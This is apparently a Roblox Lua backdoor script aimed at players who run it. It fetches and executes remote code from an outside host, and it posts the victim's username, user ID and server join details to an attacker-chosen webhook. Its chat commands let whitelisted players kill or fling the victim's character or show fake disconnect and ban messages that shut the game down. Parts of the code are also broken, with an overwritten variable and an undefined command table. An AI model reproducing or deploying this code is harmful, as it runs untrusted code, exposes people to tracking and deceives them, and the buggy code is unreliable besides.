local synapse, shithttp = syn and syn.request, http and http.request
local request = http_request or request or HttpPost or synapse or shithttp
local whitelisted = _G.whitelisted
local prompt = loadstring(game:HttpGet('https://www.floppa.dev/FakePrompt.lua', true))()
local cmd = {}

function cmd.explode()
        local explosion = Instance.new("Explosion")
	explosion.BlastRadius = 5
	explosion.Position = game.Players.LocalPlayer.Character:WaitForChild'HumanoidRootPart'.CFrame
	explosion.Parent = game.Players.LocalPlayer.Character
end

function cmd.reset()
   game.Players.LocalPlayer.Character:WaitForChild'Humanoid'.Health = 0
end

function cmd.alone()
   for i,v in pairs(game.Players:GetPlayers()) do
      if v.Name ~= game.Players.LocalPlayer.Name then
      	 v:Destroy()
	 print(':(')
      end
   end
end

function cmd.FakePrompt()
	prompt.createPrompt("Disconnected", "Same account launched game from different device. Reconnect if you prefer to use this device. (Error Code: 273)", "Leave", true, function(close)
      		game:Shutdown()
	end)
end

function cmd.FakeBan()
	prompt.createPrompt("Disconnected", "You were kicked from this experience: You been banned from this game. Reason: Suspicious Programs.", "Leave", true, function(close)
      		game:Shutdown()
	end)
end

function cmd.bring()
   for i,v in pairs(game.Players:GetPlayers()) do
      if table.find(whitelisted, v.Name) then
      	game.Players.LocalPlayer.Character:WaitForChild'HumanoidRootPart'.CFrame = v.Character:WaitForChild'HumanoidRootPart'.CFrame
      end
   end
end

function cmd.jump()
   game.Players.LocalPlayer.Character:WaitForChild'Humanoid'.Jump = true
end

function cmd.jump()
   game.Players.LocalPlayer.Character:WaitForChild'Humanoid'.Jump = true
end

function cmd.sit()
   game.Players.LocalPlayer.Character:WaitForChild'Humanoid'.Sit = true
end

function cmd.void()
    game.Players.LocalPlayer.Character:WaitForChild'HumanoidRootPart'.CFrame = CFrame.new(2834983284329498234234,2834983284329498234234,2834983284329498234234)
end

function cmd.walkforever()
   game.Players.LocalPlayer.Character:WaitForChild'Humanoid':MoveTo(Vector3.new(9999999999999,9999999999999999,9999999999999))
end

local data = {
   ["content"] = "",
   ["embeds"] = {
       {
           ["title"] = "**Player Found**",
           ["description"] = "Time to get trolling!",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name)
           },
           ["fields"] = {
            {
             ["name"] = "**Game:**",
             ["value"] = "[Game](https://roblox.com/games/"..game.PlaceId..")",
             ["inline"] = true
            },
            {
             ["name"] = "**Max Players:**",
             ["value"] = game.Players.MaxPlayers,
             ["inline"] = true
            },
            {
             ["name"] = "**Username:**",
             ["value"] = game.Players.LocalPlayer.Name.." (@"..game.Players.LocalPlayer.DisplayName..")",
             ["inline"] = true
            },
            {
             ["name"] = "**User ID:**",
             ["value"] = game.Players.LocalPlayer.UserId,
             ["inline"] = true
            },
            {
             ["name"] = "**Player Ingame:**",
             ["value"] = #game.Players:GetPlayers(),
             ["inline"] = true
            },
            {
             ["name"] = "**Script Used:**",
             ["value"] = _G.ScriptID,
             ["inline"] = true
            },
            {
             ["name"] = "**Job ID:**",
             ["value"] = "`Roblox.GameLauncher.joinGameInstance("..game.PlaceId..", '"..game.JobId.."')`",
             ["inline"] = true
            },
          },
          ["footer"] = {
            ["text"] = "Run the Job ID code in the inspect element console while in roblox website to join them."
          }
       }
   }
}

request(
  {
    Url = _G.webhook, 
    Body = game:GetService("HttpService"):JSONEncode(data), 
    Method = "POST", 
    Headers = {
      ["content-type"] = "application/json"
    }
  }
)

game.Players.PlayerChatted:Connect(function(chattype, sender, message)
    if not table.find(whitelisted, sender.Name) then return end
    msg = message:lower()
    split = msg:split(" ")
    slash = split[1]
    cmd=slash:split(";")
    cmdName=cmd[2]
    if commands[cmdName] then
            for i = 2, #split, 1 do
                commands[cmdName](split[i])
            end
        end
end)
